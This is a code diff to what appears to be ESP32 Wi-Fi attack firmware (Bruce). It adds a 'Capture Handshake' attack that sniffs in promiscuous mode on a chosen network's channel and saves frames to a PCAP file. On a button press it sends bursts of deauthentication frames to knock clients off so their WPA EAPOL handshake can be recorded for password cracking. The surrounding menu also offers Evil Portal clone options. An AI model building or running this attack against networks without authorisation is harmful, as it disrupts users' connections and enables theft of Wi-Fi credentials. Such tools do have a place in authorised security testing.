@@ -9,12 +9,15 @@
 #include "core/mykeyboard.h"
 #include "core/utils.h"
 #include "core/wifi/wifi_common.h"
+#include "core/sd_functions.h"
 #include "esp_system.h"
 #include "esp_wifi.h"
 #include "evil_portal.h"
+#include "sniffer.h"
 #include "vector"
 #include <Arduino.h>
 #include <globals.h>
+#include <nvs_flash.h>
 
 std::vector<wifi_ap_record_t> ap_records;
 /**
@@ -124,6 +127,7 @@ void wifi_atk_menu() {
             wifi_ap_record_t record;
             memcpy(record.bssid, WiFi.BSSID(i), 6);
             record.primary = static_cast<uint8_t>(WiFi.channel(i));
+			record.authmode = static_cast<wifi_auth_mode_t>(WiFi.encryptionType(i));
             ap_records.push_back(record);
 
             String ssid = WiFi.SSID(i);
@@ -222,6 +226,216 @@ ScanNets:
     returnToMenu = true;
 }
 
+
+/***************************************************************************************
+** function: capture_handshake
+** @brief: Capture handshake for a selected network
+***************************************************************************************/
+void capture_handshake(String tssid, String mac, uint8_t channel) {
+    Serial.begin(115200);
+
+    uint8_t bssid_array[6];
+    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &bssid_array[0], &bssid_array[1], &bssid_array[2],
+           &bssid_array[3], &bssid_array[4], &bssid_array[5]);
+
+    // Set the target record for deauth
+    memcpy(ap_record.bssid, bssid_array, 6);
+    ap_record.primary = channel;
+
+    String encryptionTypeStr = "Unknown";
+    for (int i = 0; i < ap_records.size(); i++) {
+        if (memcmp(ap_records[i].bssid, bssid_array, 6) == 0) {
+            switch (ap_records[i].authmode) {
+                case WIFI_AUTH_OPEN: encryptionTypeStr = "Open"; break;
+                case WIFI_AUTH_WEP: encryptionTypeStr = "WEP"; break;
+                case WIFI_AUTH_WPA_PSK: encryptionTypeStr = "WPA/PSK"; break;
+                case WIFI_AUTH_WPA2_PSK: encryptionTypeStr = "WPA2/PSK"; break;
+                case WIFI_AUTH_WPA_WPA2_PSK: encryptionTypeStr = "WPA/WPA2/PSK"; break;
+                case WIFI_AUTH_WPA2_ENTERPRISE: encryptionTypeStr = "WPA2/Enterprise"; break;
+                default: encryptionTypeStr = "Unknown"; break;
+            }
+            break;
+        }
+    }
+
+    // Sanitize SSID for use in filename
+    String sanitizedSsid = "";
+    for (size_t i = 0; i < tssid.length() && i < 32; ++i) {
+        char c = tssid[i];
+        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.') {
+            sanitizedSsid += c;
+        } else {
+            sanitizedSsid += '_';
+        }
+    }
+    if (sanitizedSsid.length() == 0) sanitizedSsid = "UNKNOWN";
+
+    char hsFileName[128];
+    sprintf(hsFileName, "/BrucePCAP/handshakes/HS_%02X%02X%02X%02X%02X%02X_%s.pcap",
+            bssid_array[0], bssid_array[1], bssid_array[2],
+            bssid_array[3], bssid_array[4], bssid_array[5],
+            sanitizedSsid.c_str());
+
+    bool hsExists = false;
+    bool captured = false;
+    FS *fs;
+    if (setupSdCard()) {
+        fs = &SD;
+        isLittleFS = false;
+        if (!SD.exists("/BrucePCAP/handshakes")) {
+            SD.mkdir("/BrucePCAP");
+            SD.mkdir("/BrucePCAP/handshakes");
+        }
+        hsExists = SD.exists(hsFileName);
+    } else {
+        fs = &LittleFS;
+        isLittleFS = true;
+        if (!LittleFS.exists("/BrucePCAP/handshakes")) {
+            LittleFS.mkdir("/BrucePCAP");
+            LittleFS.mkdir("/BrucePCAP/handshakes");
+        }
+        hsExists = LittleFS.exists(hsFileName);
+    }
+
+    // Register the file path so the sniffer knows to save the capture to it
+    String hsFilePath = String(hsFileName);
+    if (!hsExists) {
+        File hsFile = fs->open(hsFileName, FILE_WRITE);
+        if (hsFile) {
+            writeHeader(hsFile);
+            hsFile.close();
+            // Register using the file path
+            SavedHS.insert(hsFilePath);
+            // Mark as ready to capture
+            uint64_t apKey = 0;
+            for (int i = 0; i < 6; ++i) { apKey = (apKey << 8) | bssid_array[i]; }
+            markHandshakeReady(apKey);
+            Serial.println("Created new handshake file for target AP");
+            Serial.print("Target BSSID: ");
+            for (int i = 0; i < 6; i++) {
+                Serial.printf("%02X", bssid_array[i]);
+                if (i < 5) Serial.print(":");
+            }
+            Serial.println();
+            Serial.println("Added to SavedHS set for beacon capture");
+        } else {
+            Serial.println("Failed to create handshake file");
+        }
+    } else {
+        // File already exists: Add to SavedHS and mark as captured
+        SavedHS.insert(hsFilePath);
+        uint64_t apKey = 0;
+        for (int i = 0; i < 6; ++i) { apKey = (apKey << 8) | bssid_array[i]; }
+        markHandshakeReady(apKey);
+        captured = true;
+        Serial.println("Handshake file already exists");
+    }
+
+    WiFi.mode(WIFI_AP);
+    if (!WiFi.softAP("BruceCapture", emptyString, channel, 1, 4, false)) {
+        displayError("Failed to start AP", true);
+        return;
+    }
+
+    // Initialize sniffer backend
+    if (!sniffer_prepare_storage(fs, !isLittleFS)) {
+        displayError("Sniffer queue error", true);
+        return;
+    }
+
+    ch = channel;
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(sniffer);
+    wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
+    esp_wifi_set_channel(channel, secondCh);
+
+    wifiConnected = true;
+    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+
+    uint32_t lastDraw = millis();
+    int deauthCount = 0;
+    int initialNumEAPOL = num_EAPOL;
+    int beaconCount = 0;
+    bool hasBeacons = false;
+    bool hasEAPOL = false;
+
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.setTextSize(FM);
+
+    while (true) {
+        // Check if we have beacons
+        BeaconList targetBeacon;
+        memcpy(targetBeacon.MAC, bssid_array, 6);
+        targetBeacon.channel = channel;
+        if (registeredBeacons.find(targetBeacon) != registeredBeacons.end()) {
+            hasBeacons = true;
+        }
+
+        // Check if EAPOL was captured
+        if (num_EAPOL > initialNumEAPOL) {
+            hasEAPOL = true;
+        }
+
+        if (millis() - lastDraw > 500) {
+            drawMainBorderWithTitle("Handshake Capture");
+            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+            padprintln("");
+            padprintln("SSID: " + tssid);
+            padprintln("BSSID: " + mac);
+            padprintln("Security: " + encryptionTypeStr);
+            padprintln("");
+
+            // Show console status
+            if (hasBeacons && hasEAPOL) {
+                tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
+                padprintln("Status: CAPTURED!");
+                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+                captured = true;
+            } else if (hasBeacons && !hasEAPOL) {
+                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
+                padprintln("Status: Beacon captured");
+                padprintln("        Waiting EAPOL...");
+                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+            } else {
+                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
+                padprintln("Status: Waiting...");
+                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+            }
+
+            padprintln("");
+            padprintln("Deauth sent: " + String(deauthCount));
+            padprintln("");
+            tft.drawString("Press " + String(BTN_ALIAS) + " to send deauth", 10, tftHeight - 35);
+            tft.drawString("Press Back to exit", 10, tftHeight - 20);
+
+            lastDraw = millis();
+        }
+
+        if (check(SelPress)) {
+            wsl_bypasser_send_raw_frame(&ap_record, channel);
+            for (int i = 0; i < 5; i++) {
+                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+                vTaskDelay(10 / portTICK_RATE_MS);
+            }
+            deauthCount += 5;
+            lastDraw = 0;
+        }
+
+        if (check(EscPress)) {
+            break;
+        }
+
+        vTaskDelay(50 / portTICK_RATE_MS);
+    }
+
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    wifiDisconnect();
+    returnToMenu = true;
+}
+
+
 /***************************************************************************************
 ** function: target_atk_menu
 ** @brief: Open menu to choose which AP Attack
@@ -231,6 +445,7 @@ AGAIN:
     options = {
         {"Information",         [=]() { wifi_atk_info(tssid, mac, channel); }      },
         {"Deauth",              [=]() { target_atk(tssid, mac, channel); }         },
+		{"Capture Handshake",   [=]() { capture_handshake(tssid, mac, channel); }  },
         {"Clone Portal",        [=]() { EvilPortal(tssid, channel, false, false); }},
         {"Deauth+Clone",        [=]() { EvilPortal(tssid, channel, true, false); } },
         {"Deauth+Clone+Verify",
